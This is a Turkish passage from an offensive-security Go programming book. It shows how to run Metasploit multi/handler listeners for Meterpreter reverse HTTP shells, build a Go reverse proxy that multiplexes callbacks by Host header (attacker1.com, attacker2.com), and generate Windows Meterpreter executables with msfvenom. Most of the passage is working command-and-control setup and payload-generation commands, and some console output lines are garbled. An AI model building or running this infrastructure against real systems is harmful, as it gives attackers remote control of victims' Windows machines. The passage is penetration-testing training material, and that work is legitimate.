```bash
$ msfconsole
> use exploit/multi/handler
  set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 10080
  exploit -j -z
[I Exploit running as background job 1.

[41 Started HTTP reverse handler on http://10.0.1.20:10080
```

Dinleyicinizi başlatırken, vekil (proxy) verilerini `LHOST` ve `LPORT` değerleri olarak sağlarsınız. Ancak gelişmiş seçenekler olan `ReverseListenerBindAddress` ve `ReverseListenerBindPort` değerlerini, dinleyicinin gerçekten hangi IP ve port üzerinde başlayacağını gösterecek şekilde ayarlarsınız. Bu yaklaşım, port kullanımı konusunda size bir esneklik sağlarken, vekil sunucuyu (örneğin, alan adı önyüzlemesi (domain fronting) kuruyorsanız bir hostname) açıkça belirtmenize olanak tanır.

İkinci bir Metasploit örneğinde, port 20080 üzerinde ek bir dinleyici başlatmak için benzer bir işlem yapacaksınız. Buradaki tek gerçek fark, farklı bir porta bağlanmanızdır:

```bash
$ msfconsole
> use exploit/multi/handler
  set payload windows/meterpreter_reverse_http
> set LHOST 10.0.2.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 20080
> exploit -j -z
[4] Exploit running as background job 1.

[4 ] Started HTTP reverse handler on http://10.0.1.20:20080
```

Şimdi, ters vekil sunucunuzu (reverse proxy) oluşturalım. Liste 4-10 kodun tamamını göstermektedir.

```go
package main

import (
   "log"
   "net/http"
   "net/http/httputil"
   "net/url"

   "github.com/gorilla/mux"
)

var (
    hostProxy = make(map[string]string)
    proxies   = make(map[string]*httputil.ReverseProxy)
)

func init() {
    hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
    hostProxy["attacker2.com"] = "http://10.0.1.20:20080"

    for k, v := range hostProxy {
        remote, err := url.Parse(v)
        if err != nil {
            log.Fatal("Unable to parse proxy target")
        }

        proxies[k] = httputil.NewSingleHostReverseProxy(remote)
    }
}

func main() {
    r := mux.NewRouter()
    for host, proxy := range proxies {
        r.Host(host).Handler(proxy)
    }

    log.Fatal(http.ListenAndServe(":80", r))
}
```

Liste 4-10: Meterpreter çoğullama (multiplexing) (`ich-21/multiplexer/main.go`)

İlk olarak, `net/http/httputil` paketini içe aktardığınıza dikkat edin; bu paket, ters vekil (reverse proxy) oluşturmanıza yardımcı olacak işlevsellik içerir. Bu sayede sıfırdan bir reverse proxy yazmak zorunda kalmazsınız.

Paketleri içe aktardıktan sonra, bir çift değişken tanımlarsınız. Her iki değişken de `map` türündedir. İlk `map`, `hostProxy`, host adlarını yönlendirmek istediğiniz Metasploit dinleyici URL’lerine eşlemek için kullanılacaktır. Unutmayın, gelen HTTP isteğindeki `Host` başlığına (header) göre yönlendirme yapacaksınız. Bu eşlemeyi tutmak, hedefleri belirlemenin basit bir yoludur.

Tanımladığınız ikinci değişken, `proxies`, yine anahtar değeri olarak host adlarını kullanacaktır. Ancak bu `map` içindeki karşılık gelen değerler `*httputil.ReverseProxy` örnekleridir. Yani, bu değerler hedefin string temsili yerine, gerçekten yönlendirme yapabileceğiniz proxy örnekleridir.

Bu bilgiyi kodun içinde sabit (hardcode) yazdığınıza dikkat edin; bu, yapılandırma ve proxy verilerini yönetmenin en zarif yolu değildir. Daha iyi bir uygulamada, bu bilgileri harici bir yapılandırma dosyasında saklarsınız. Bunu size bırakıyoruz.

`init()` fonksiyonunu kullanarak alan adları ile hedef Metasploit örnekleri arasındaki eşlemeleri tanımlarsınız. Bu örnekte, `Host` başlığı değeri `attacker1.com` olan herhangi bir isteği `http://10.0.1.20:10080` adresine; `Host` başlığı `attacker2.com` olan her şeyi ise `http://10.0.1.20:20080` adresine yönlendireceksiniz. Elbette, şu anda henüz gerçek yönlendirmeyi yapmıyorsunuz; sadece basit bir yapılandırma oluşturuyorsunuz. Hedeflerin, önceki Meterpreter dinleyicileriniz için kullandığınız `ReverseListenerBindAddress` ve `ReverseListenerBindPort` değerleriyle uyuştuğuna dikkat edin.

Sonraki adımda, hâlâ `init()` fonksiyonunun içinde, `hostProxy` `map`’i üzerinde döngüye girerek, hedef adresleri ayrıştırıp `net.URL` örnekleri oluşturursunuz. Bunun sonucunu `httputil.NewSingleHostReverseProxy(net.URL)` çağrısına girdi olarak kullanırsınız; bu, bir URL’den reverse proxy yaratan yardımcı bir fonksiyondur. Daha da iyisi, `httputil.ReverseProxy` tipi `http.Handler` arayüzünü (interface) karşılar; bu da oluşturduğunuz proxy örneklerini router için handler olarak kullanabileceğiniz anlamına gelir. Bunu `main()` fonksiyonu içinde yaparsınız. Bir router oluşturur ve sonra tüm proxy örnekleri üzerinde döngü kurarsınız. Anahtarın hostname, değerin ise `httputil.ReverseProxy` tipinde olduğunu unutmayın. `map`’inizdeki her anahtar/değer çifti için router’a karşılık gelen bir eşleme fonksiyonu eklersiniz.

Gorilla MUX araç takımının `Route` tipi, gelen isteklerdeki `Host` başlığı değerlerini belirli bir hostname ile eşleştirmek için kullanılan `Host` adında bir eşleme fonksiyonu içerir. İncelemek istediğiniz her hostname için router’a, ilgili proxy’yi kullanmasını söylersiniz. Aksi takdirde karmaşık olabilecek bir problemi şaşırtıcı derecede kolay bir şekilde çözmüş olursunuz.

Programınız, sunucuyu başlatarak ve port 80’e bağlayarak (bind) tamamlanır. Programı kaydedip çalıştırın. Ayrıcalıklı (privileged) bir porta bağlandığınız için, bunu ayrıcalıklı bir kullanıcı olarak yapmanız gerekecektir.

Bu noktada, iki adet Meterpreter ters HTTP dinleyicisi çalışır durumda ve reverse proxy’niz de çalışıyor olmalıdır. Son adım, proxy’nizin çalıştığını doğrulamak için test yükleri (payload) üretmektir. Metasploit ile birlikte gelen, yük üretme aracı `msfvenom`u kullanarak bir çift Windows çalıştırılabilir dosyası (executable) üretelim:

```bash
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80 \
HttpHostHeader=attacker1.com -f exe -o payload1.exe
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.2.20 LPORT=80 \
HttpHostHeader=attacker2.com -f exe -o payload2.exe
```
